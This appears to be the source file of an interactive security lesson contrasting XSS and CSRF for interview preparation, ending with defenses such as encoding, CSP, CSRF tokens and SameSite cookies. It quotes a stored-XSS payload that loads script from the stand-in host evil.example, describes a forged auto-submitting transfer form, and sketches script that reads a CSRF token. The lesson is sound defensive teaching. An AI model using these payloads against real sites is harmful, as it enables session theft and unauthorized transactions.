(function () {
  const { block, device, db, card, both, link, flow, rt, red, green, amber, gray, note, bad, good, warn } = SD;

  const alice = (tags = [], o = {}) => device(0, -20, Object.assign({ label: "Alice", tags }, o));
  const mallory = (tags = [], o = {}) => device(0, -20, Object.assign({ label: "attacker", labelIcon: "skull", screen: "red", tags }, o));
  const app = (tags = [], o = {}) => block(0, -6, Object.assign({ label: ["Shop", "App"], glyph: "store", tags }, o));
  const data = (tags = [], o = {}) => db(0, 10, Object.assign({ label: "sessions", glyph: "cookie", tags }, o));
  const evil = (tags = [], o = {}) => block(-16, 2, Object.assign({ s: 3.6, h: 34, label: ["evil", "example"], glyph: "skull", color: "red", tags, pills: "below" }, o));
  const low = (dx = -300, dy = -210) => ({ x: 0, y: -6, dx, dy });

  const ask = (who, label = "GET /account") => both(who, "app", { label, labelAt: 0.4, labelSide: "below" });

  SD.lesson({
    id: "xss-vs-csrf",
    title: "XSS vs CSRF",
    summary: "Two browser-side classics that people mix up: attacker script inside your origin versus a forged request that rides the victim's cookies.",
    minutes: 12,
    level: "intermediate",
    metrics: [
      { id: "runs", label: "What runs / fires", icon: "code" },
      { id: "gets", label: "Attacker gets", icon: "eye" },
      { id: "defense", label: "Defense", icon: "shield" },
    ],
    legend: [["mine", "Alice"], ["poison", "attacker action"], ["secret", "stolen / forged"], ["req", "browser request"], ["res", "safe response"], ["empty", "blocked"]],
    goals: [
      { text: "One-sentence distinction XSS vs CSRF", step: 0 },
      { text: "Why XSS can defeat CSRF tokens", step: 4 },
      { text: "HttpOnly limits cookie theft, not CSRF", step: 5 },
      { text: "Defense pairs for each class", step: 6 },
    ],
    steps: [
      {
        short: "Two bugs",
        chapter: "setup",
        title: "Same browser, different crimes",
        body: [
          "Alice is logged into the shop. Her browser holds a session cookie and renders HTML from <code>shop.example</code>. Two interview favorites abuse that setup in opposite ways.",
          "<b>XSS</b> puts attacker JavaScript into the shop's origin so it can read the DOM, call APIs as Alice, and often steal tokens. <b>CSRF</b> never needs script on the shop: another site makes Alice's browser send a state-changing request with her cookies attached.",
        ],
        callout: { kind: "insight", text: "Shortcut: XSS executes in the victim's origin. CSRF forges a request that the victim's browser authenticates automatically." },
        metrics: { runs: "compare", gets: "-", defense: "-" },
        scene: {
          entities: {
            alice: alice([note("cookie session=...", "cookie")]),
            app: app([amber("trusted origin + cookies", "store")]),
            data: data([note("alice logged in", "userCheck")]),
            evil: evil([], { dim: 0.5 }),
            card: card(low(), "Axis", ["XSS: attacker code IN shop origin", "CSRF: request FROM other site", "  with ambient cookies", "! mix them up in interviews"], { icon: "split" }),
          },
          links: { ua: ask("alice"), ad: both("app", "data", { label: "session ok", labelAt: 0.5 }) },
          flows: [flow("ua", "mine", { rate: 0.7 }), flow("ad", "req", { rate: 0.6, delay: 0.45 })],
        },
      },
      {
        short: "XSS path",
        chapter: "attack",
        title: "XSS: script that owns the page",
        body: [
          "Mallory posts a comment with <code>&lt;script src=//evil.example/x.js&gt;</code>. The shop echoes it into HTML. When Alice opens the thread, her browser runs that script as if the shop wrote it.",
          "From inside the origin the script can read cookies (if not HttpOnly), call <code>/api/transfer</code>, rewrite the DOM, or exfiltrate page data. The damage is confidentiality and integrity inside Alice's session.",
        ],
        callout: { kind: "warn", text: "Same-origin policy helps the attacker here: their script is same-origin with the shop." },
        changes: ["- Stored script in comment", "- Runs in Alice's shop tab", "- Session / data readable"],
        metrics: { runs: bad("attacker JS"), gets: bad("DOM + APIs"), defense: bad("none") },
        scene: {
          entities: {
            alice: alice([red("runs x.js", "code")], { screen: "red" }),
            app: app([red("echoes unescaped HTML", "alert")]),
            data: data([red("session usable by script", "cookie")], { heat: 0.3 }),
            evil: evil([red("hosts x.js", "skull")]),
            card: card(low(), "XSS", ["comment: <script src=//evil...>", "browser treats it as shop code", "! read cookies / call APIs", "! rewrite UI, phish inside page"], { icon: "bug" }),
          },
          links: {
            ua: ask("alice", "GET /thread/42"),
            ad: both("app", "data"),
            ex: link("alice", "evil", { label: "exfil", labelTone: "red", style: "dashed", labelAt: 0.5, labelSide: "below" }),
          },
          flows: [flow("ua", "poison", { rate: 0.6 }), flow("ad", "poison", { rate: 0.5, delay: 0.4 }), flow("ex", "secret", { rate: 0.5, delay: 1 })],
        },
      },
      {
        short: "CSRF path",
        chapter: "attack",
        title: "CSRF: forged request, no shop script",
        body: [
          "Alice opens <code>evil.example</code> while still logged in. A hidden form POSTs to <code>https://shop.example/transfer</code> with <code>to=mallory&amp;amount=500</code>. The browser attaches her shop cookie automatically.",
          "The shop never runs Mallory's JavaScript. It just sees a valid session cookie and a well-formed transfer. Mallory does not need to read the response; the side effect is enough.",
        ],
        callout: { kind: "warn", text: "CSRF needs ambient auth (usually cookies), a state-changing action, and no secret the attacker must know." },
        changes: ["- Cross-site form POST", "- Cookie attached by browser", "- Transfer executes"],
        metrics: { runs: bad("forged POST"), gets: bad("state change"), defense: bad("none") },
        scene: {
          entities: {
            alice: alice([red("tab: evil.example", "globe")]),
            app: app([red("cookie valid: transfer ok", "creditCard")]),
            data: data([red("-$500", "wallet")], { heat: 0.3 }),
            evil: evil([red("auto-submit form", "code")]),
            card: card(low(), "CSRF", ["form action=shop/transfer", "browser adds Cookie", "! no script on shop required", "! attacker may not read reply"], { icon: "upload" }),
          },
          links: {
            ae: both("alice", "evil", { label: "opens link", labelAt: 0.45, labelSide: "below" }),
            ua: ask("alice", "POST /transfer + cookie"),
            ad: both("app", "data", { label: "debit", labelTone: "red", labelAt: 0.5 }),
          },
          flows: [flow("ae", "mine", { rate: 0.5 }), flow(["ua", "ad"], "poison", { rate: 0.55, delay: 0.9 })],
        },
      },
      {
        short: "Compare",
        chapter: "technique",
        title: "Side-by-side: what breaks",
        body: [
          "XSS breaks the trust boundary of the page: code identity. CSRF breaks the trust that \"a request with a cookie was intentional\". Encoding and CSP target XSS. Tokens, SameSite, and Origin checks target CSRF.",
          "CORS is not a CSRF fix: it gates who may <b>read</b> a response. A simple cross-site form POST still runs. SOP does not stop CSRF either; it stops the attacker from reading the shop's HTML to steal a token without XSS.",
        ],
        callout: { kind: "tip", text: "If the interviewer asks \"which is worse\", say XSS usually includes CSRF: once you run script, you can read tokens and act." },
        changes: ["~ XSS: confidentiality + integrity", "~ CSRF: integrity of actions", "! CORS != CSRF defense"],
        metrics: { runs: warn("both classes"), gets: warn("different goals"), defense: "different tools" },
        scene: {
          entities: {
            alice: alice([note("one browser, two threats", "laptop")]),
            app: app([amber("needs both defenses", "shieldAlert")]),
            data: data([note("session cookie", "cookie")]),
            evil: evil([amber("script host OR form host", "skull")]),
            card: card(low(-310), "Cheat sheet", ["XSS: inject/run script", "CSRF: forge authenticated req", "XSS fix: encode + CSP + TT", "CSRF fix: token + SameSite + Origin", "! CORS protects reads, not writes"], { icon: "listChecks" }),
          },
          links: { ua: ask("alice"), ae: both("alice", "evil", { label: "other site", labelAt: 0.45 }) },
          flows: [flow("ua", "mine", { rate: 0.5 }), flow("ae", "poison", { rate: 0.4, delay: 0.5 })],
        },
      },
      {
        short: "Token fail",
        chapter: "problem",
        title: "XSS reads the CSRF token",
        body: [
          "Teams often say \"we have CSRF tokens, so we're fine\". A synchronizer token stops a cross-site form that cannot see the shop's HTML. XSS runs <b>on</b> the shop, so it can read the hidden field or meta tag and POST with a valid token.",
          "Same for double-submit cookies copied into a header by JavaScript: attacker script can do that copy too. CSRF tokens are not an XSS control.",
        ],
        callout: { kind: "warn", text: "Interview follow-up: can CSRF tokens stop XSS? No. XSS can mint legitimate state-changing requests." },
        changes: ["- Script reads csrf=...", "- Forged-looking POST accepted", "! Token != XSS defense"],
        metrics: { runs: bad("XSS + token theft"), gets: bad("authorized writes"), defense: warn("token only") },
        scene: {
          entities: {
            alice: alice([red("script reads csrf field", "key")], { screen: "red" }),
            app: app([red("token matches: 200", "alert")]),
            data: data([red("state changed", "wallet")], { heat: 0.3 }),
            evil: evil([red("receives token copy", "eye")]),
            card: card(low(), "Token bypass via XSS", ["document.querySelector(\"[name=csrf]\")", "fetch(\"/transfer\", { body + token })", "! same-origin script sees the secret", "= fix XSS separately"], { icon: "key" }),
          },
          links: {
            ua: ask("alice", "POST /transfer + stolen token"),
            ad: both("app", "data"),
            ex: link("alice", "evil", { label: "optional exfil", style: "dashed", labelTone: "red", labelAt: 0.5 }),
          },
          flows: [flow("ua", "poison", { rate: 0.65 }), flow("ad", "poison", { rate: 0.55, delay: 0.45 }), flow("ex", "secret", { rate: 0.35, delay: 1 })],
        },
      },
      {
        short: "HttpOnly",
        chapter: "problem",
        title: "HttpOnly limits cookie theft, not CSRF",
        body: [
          "<code>HttpOnly</code> stops JavaScript from reading <code>document.cookie</code>. That shrinks classic session-theft XSS. It does nothing to CSRF: the browser still attaches the cookie on forged navigations and form POSTs.",
          "Conversely, moving the SPA to a bearer token in <code>localStorage</code> removes ambient cookie CSRF, but any XSS can read the token. Pick the trade-off deliberately; do not claim one flag fixes both bugs.",
        ],
        callout: { kind: "insight", text: "Ask what the browser attaches automatically. Cookies are ambient. Authorization headers usually are not." },
        changes: ["+ HttpOnly: script can't read cookie", "- CSRF still attaches cookie", "- Token in localStorage: XSS reads it"],
        metrics: { runs: warn("depends"), gets: warn("partial"), defense: warn("HttpOnly alone") },
        scene: {
          entities: {
            alice: alice([amber("HttpOnly cookie", "cookie")]),
            app: app([amber("forged POST still authed", "alert")]),
            data: data([red("CSRF still works", "wallet")]),
            evil: evil([red("form POST", "upload")]),
            card: card(low(), "Flag limits", ["HttpOnly: no document.cookie", "! browser still sends Cookie header", "Bearer in JS: no CSRF ambient", "! XSS can read storage/memory"], { icon: "cookie" }),
          },
          links: {
            ae: both("alice", "evil", { label: "evil page", labelAt: 0.45 }),
            ua: ask("alice", "POST /transfer + cookie"),
            ad: both("app", "data"),
          },
          flows: [flow("ae", "poison", { rate: 0.5 }), flow(["ua", "ad"], "poison", { rate: 0.55, delay: 0.9 })],
        },
      },
      {
        short: "Defense pair",
        chapter: "solution",
        title: "Fix each class with the right layers",
        body: [
          "For XSS: context-aware output encoding, avoid dangerous sinks, prefer frameworks that auto-escape, add a strict nonce-based CSP, and consider Trusted Types. Treat user HTML with a real sanitizer, not regex.",
          "For CSRF: no state-changing GET; synchronizer or double-submit tokens; <code>SameSite=Lax</code> or <code>Strict</code>; reject <code>Sec-Fetch-Site: cross-site</code> on writes; require <code>application/json</code> when that forces a failed preflight. Stack them.",
        ],
        callout: { kind: "tip", text: "Production answer: encode + CSP for XSS; token + SameSite + Fetch Metadata for CSRF. Test both." },
        changes: ["+ Encode + CSP (+ Trusted Types)", "+ CSRF token + SameSite + Origin", "~ Separate test cases"],
        metrics: { runs: good("blocked paths"), gets: good("limited"), defense: good("paired") },
        scene: {
          entities: {
            alice: alice([green("safe render + SameSite", "shieldCheck")]),
            app: app([green("encode + token check", "shieldCheck")]),
            data: data([green("unchanged", "check")]),
            evil: evil([gray("form / script fail", "ban")]),
            card: card(low(-310), "Paired controls", ["XSS: escape, CSP nonce, sanitizer", "CSRF: token, SameSite, Sec-Fetch-Site", "safe methods: GET read-only", "# verify with separate suites"], { icon: "shieldCheck" }),
          },
          links: {
            ae: both("alice", "evil", { label: "blocked forge", labelAt: 0.45 }),
            ua: ask("alice", "POST /transfer + token"),
            ad: both("app", "data"),
          },
          flows: [flow("ae", "poison", { rate: 0.45, blocked: true }), flow(["ua", "ad"], "mine", { rate: 0.6, delay: 0.5 })],
        },
      },
      {
        short: "Together",
        chapter: "insight",
        title: "When both show up in one chain",
        body: [
          "A stored XSS on a low-value page can still call privileged APIs. Login CSRF can put Alice into Mallory's account so she saves a card there. Subdomain XSS plus cookie scope <code>Domain=.example.com</code> can widen both problems.",
          "In design reviews, list ambient credentials, every place you render untrusted data, and every state-changing route. Those three lists catch most XSS/CSRF interview scenarios.",
        ],
        callout: { kind: "insight", text: "XSS often implies CSRF capability. CSRF does not imply XSS." },
        changes: ["- XSS -> authenticated API abuse", "- Login CSRF -> data in attacker account", "~ Cookie Domain widens blast"],
        metrics: { runs: bad("chained"), gets: bad("account takeover paths"), defense: warn("incomplete") },
        scene: {
          entities: {
            alice: alice([red("XSS tab + forged paths", "alert")], { screen: "red" }),
            app: app([red("multiple sinks", "bug")]),
            data: data([red("PII / funds", "eye")], { heat: 0.3 }),
            evil: evil([red("collector", "skull")]),
            card: card(low(), "Review list", ["1. ambient creds (cookies, basic)", "2. render sinks (HTML, JS, URL)", "3. state-changing routes", "= cover XSS and CSRF explicitly"], { icon: "list" }),
          },
          links: {
            ua: ask("alice", "mixed abuse"),
            ad: both("app", "data", { labelTone: "red", label: "impact", labelAt: 0.5 }),
            ex: link("alice", "evil", { style: "dashed", labelTone: "red", label: "exfil", labelAt: 0.5 }),
          },
          flows: [flow("ua", "poison", { rate: 0.55 }), flow("ad", "secret", { rate: 0.5, delay: 0.45 }), flow("ex", "secret", { rate: 0.4, delay: 1 })],
        },
      },
      {
        short: "Interview",
        chapter: "technique",
        title: "What interviewers want to hear",
        body: [
          "Lead with the one-liner distinction, then name one concrete exploit for each, then the defense pair. Mention that CSRF tokens fail under XSS, and that HttpOnly is not a CSRF control.",
          "Good follow-ups you can offer: login CSRF, SameSite vs same-origin, JSON APIs that still parse <code>text/plain</code>, and CSP nonce rollout without breaking the app.",
        ],
        callout: { kind: "tip", text: "Sound senior: separate test cases for stored XSS vs CSRF on the same state-changing routes." },
        changes: ["+ Clear distinction", "+ Exploit + fix each", "+ Know the token/HttpOnly traps"],
        metrics: { runs: good("explained"), gets: good("scoped"), defense: good("paired") },
        scene: {
          entities: {
            alice: alice([note("candidate whiteboard", "pen")]),
            app: app([green("model answers ready", "checkCircle")]),
            data: data([note("examples ready", "clipboard")]),
            card: card(low(), "Say this", ["XSS = attacker script in origin", "CSRF = forged req + cookies", "tokens stop CSRF, not XSS", "HttpOnly != CSRF defense"], { icon: "message" }),
          },
          links: { ua: ask("alice", "explain both") },
          flows: [flow("ua", "mine", { rate: 0.65, back: "res" })],
        },
      },
      {
        short: "Recap",
        chapter: "recap",
        title: "Recap: distinguish, then layer",
        body: [
          `<table class="compare">
            <thead><tr><th>Class</th><th>Core idea</th><th>Primary fixes</th></tr></thead>
            <tbody>
              <tr><td>XSS</td><td>Attacker script in your origin</td><td>Encode, sanitize, CSP, Trusted Types</td></tr>
              <tr><td>CSRF</td><td>Cross-site req with ambient auth</td><td>Token, SameSite, Origin / Fetch Metadata</td></tr>
              <tr><td>Trap</td><td>XSS reads CSRF tokens</td><td>Fix XSS; tokens alone insufficient</td></tr>
              <tr><td>Trap</td><td>HttpOnly / CORS</td><td>Not CSRF defenses</td></tr>
            </tbody>
          </table>`,
          "Interview shortcut: XSS executes; CSRF forges. Defend each on purpose. Never claim one control covers both.",
        ],
        callout: { kind: "next", text: "Deeper dives: dedicated <b>XSS</b> and <b>CSRF</b> lessons, then cookie flags and security headers." },
        metrics: { runs: good("classified"), gets: good("contained"), defense: good("layered") },
        scene: {
          entities: {
            alice: alice([green("safe browsing", "shieldCheck")]),
            app: app([green("encode + CSRF checks", "shieldCheck")]),
            data: data([green("session intact", "lock")]),
            evil: evil([gray("no foothold", "ban")], { dim: 0.45 }),
          },
          links: { ua: ask("alice", "GET /account"), ad: both("app", "data") },
          flows: [flow("ua", "mine", { rate: 0.7 }), flow("ad", "req", { rate: 0.55, delay: 0.4 })],
        },
      },
    ],
  });
})();
